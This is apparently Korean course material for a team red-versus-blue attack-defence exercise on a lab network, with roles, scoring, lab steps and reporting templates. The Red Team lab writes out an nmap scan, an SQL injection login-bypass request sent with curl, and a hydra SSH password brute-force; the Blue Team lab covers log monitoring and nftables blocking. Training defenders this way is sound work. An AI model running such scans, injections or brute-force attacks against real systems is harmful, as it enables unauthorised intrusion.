# Part 1: 팀 공방전 이론 (15분)

## 1.1 팀 구성

### Red Team 역할 분담

| 역할 | 담당자 수 | 책임 |
|------|----------|------|
| **리더** | 1명 | 작전 계획, 우선순위 결정, 시간 관리 |
| **정찰 담당** | 1명 | 네트워크 스캔, 취약점 식별 |
| **침투 담당** | 1-2명 | 공격 실행, 권한 상승, 플래그 획득 |
| **기록 담당** | 1명 | 타임라인 기록, 증거 수집 |

### Blue Team 역할 분담

| 역할 | 담당자 수 | 책임 |
|------|----------|------|
| **리더** | 1명 | 방어 전략, 우선순위 결정 |
| **방화벽 담당** | 1명 | nftables 관리, IP 차단 |
| **모니터링 담당** | 1-2명 | IDS 감시, 로그 분석 |
| **대응 담당** | 1명 | 인시던트 대응, 증거 보존 |

## 1.2 팀 공방전 규칙

### 환경

```
네트워크 구성 (3대 서버)
┌─────────────┐
│  Red Team   │
│  공격 거점  │──┐
└─────────────┘  │
                 ├──→ [서버 A: 웹 서버]     ← Blue Team 방어
                 ├──→ [서버 B: 보안 서버]   ← Blue Team 방어
                 └──→ [서버 C: SIEM 서버]   ← Blue Team 방어
```

### 점수 체계

| 항목 | Red Team | Blue Team |
|------|----------|-----------|
| 서버당 플래그 획득 | +30 | - |
| 서비스 다운타임(분) | +2/분 | -2/분 |
| 취약점 발견 | +10 | - |
| 공격 탐지 | - | +10 |
| 공격 차단 | - | +15 |
| 인시던트 보고서 | - | +20 |
| 팀워크 평가 | +10 | +10 |

# Part 2: 실습 가이드

## 실습 2.1: Red Team — 팀 작전 수행

> **목적**: 팀으로 협력하여 다수 대상을 동시에 공격한다
> **배우는 것**: 작전 계획, 역할 분담, 실시간 협업

```bash
# 팀 전략 수립 (20분)
# 1. 대상 서버 분석 및 공격 우선순위 결정
# 2. 각 팀원에게 대상 할당
# 3. 공격 타임라인 수립
# 4. 통신 채널 확보

# 정찰 담당: 전체 네트워크 스캔
nmap -sS -sV -T3 -p 22,80,443,3000,8080 10.20.30.0/24 -oA /tmp/team_recon

# 침투 담당 A: 웹 서버 공격
# SQL Injection
curl -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}'

# 침투 담당 B: SSH 공격
hydra -l admin -P /tmp/passwords.txt ssh://10.20.30.1 -t 4 -f

# 리더: 진행 상황 수집 및 전략 조정
echo "$(date) - 웹 서버 SQLi 시도 중" >> /tmp/red_team_log.txt
echo "$(date) - SSH 공격 진행 중" >> /tmp/red_team_log.txt

# 기록 담당: 모든 활동 타임라인 기록
cat > /tmp/red_timeline.md << 'EOF'
# Red Team 작전 타임라인
| 시간 | 담당자 | 대상 | 활동 | 결과 |
|------|--------|------|------|------|
| 00:00 | 정찰 | 전체 | nmap 스캔 | 3대 서버 발견 |
| 00:10 | 침투A | web | SQLi 시도 | 진행중 |
| 00:10 | 침투B | secu | SSH 공격 | 진행중 |
EOF
```

> **결과 해석**: 팀 작전에서는 병렬 작업으로 시간을 절약하고, 리더가 전체 진행 상황을 파악하여 전략을 조정한다.

## 실습 2.2: Blue Team — 팀 방어 수행

> **목적**: 팀으로 협력하여 다수 서버를 동시에 방어한다
> **배우는 것**: 분산 방어, 정보 공유, 에스컬레이션

```bash
# 팀 전략 수립 (20분)
# 1. 각 서버 담당자 배정
# 2. 통신 프로토콜 합의
# 3. 에스컬레이션 기준 설정
# 4. 강화 체크리스트 배포

# 방화벽 담당: 전체 서버 방화벽 설정
for SERVER in 10.20.30.1 10.20.30.80 10.20.30.100; do
  echo "방화벽 설정: $SERVER"
  # 각 서버에 SSH 접속하여 nftables 적용
done

# 모니터링 담당 A: 웹 서버 감시
tail -f /var/log/suricata/fast.log | grep --color "ATTACK\|SCAN\|SQL"

# 모니터링 담당 B: 인증 로그 감시 (전체 서버)
tail -f /var/log/auth.log | grep --color "Failed\|Invalid"

# 대응 담당: 탐지된 공격에 대한 즉시 대응
# 공유 차단 목록 관리
echo "# 차단 IP 목록" > /tmp/blocked_ips.txt

# IP 차단 함수
block_ip() {
  echo "$(date): 차단 - $1 (사유: $2)" >> /tmp/defense_log.txt
  sudo nft add element inet filter blocked_ips { "$1" }
  echo "$1" >> /tmp/blocked_ips.txt
}

# 리더: 팀 내 소통 및 상황 파악
# 정기 상태 보고 (10분 간격)
echo "=== Blue Team 상황 보고 $(date) ===" >> /tmp/blue_status.txt
echo "서버 A: 정상 / 공격 0건" >> /tmp/blue_status.txt
echo "서버 B: 스캔 탐지 2건 / 차단 1건" >> /tmp/blue_status.txt
```

> **결과 해석**: 정기 상황 보고를 통해 팀 전체가 현재 상태를 공유하고, 특정 서버에 공격이 집중되면 인력을 재배치한다.

## 실습 2.3: 결과 발표 준비

> **목적**: 공방전 결과를 체계적으로 정리하여 발표한다
> **배우는 것**: 결과 분석, 보고서 작성, 교훈 도출

```bash
# Red Team 결과 보고서 구성
cat << 'EOF'
## Red Team 결과 보고서
1. 작전 요약
2. 발견된 취약점 목록
3. 성공/실패한 공격 분석
4. 타임라인
5. 개선 권고사항
EOF

# Blue Team 결과 보고서 구성
cat << 'EOF'
## Blue Team 결과 보고서
1. 방어 체계 개요
2. 탐지된 공격 목록 (타임라인)
3. 대응 조치 내역
4. 서비스 가용성 통계
5. 미탐지 공격 분석
6. 개선 계획
EOF
```

# Part 3: 심화 학습

## 3.1 팀 커뮤니케이션 프로토콜

효과적인 팀 공방전을 위한 소통 규칙:

- **형식화된 보고**: "서버 [이름], 공격 유형 [유형], 상태 [탐지/차단/진행중]"
- **에스컬레이션**: 권한 상승 탐지 시 즉시 리더에게 보고
- **10분 체크인**: 정기적 상황 공유

## 3.2 전략적 사고

- Red Team: 약한 서버를 먼저 공략하여 교두보 확보
- Blue Team: 핵심 자산(플래그) 보호에 우선 집중
- 양팀 모두: 시간 관리가 승패를 좌우
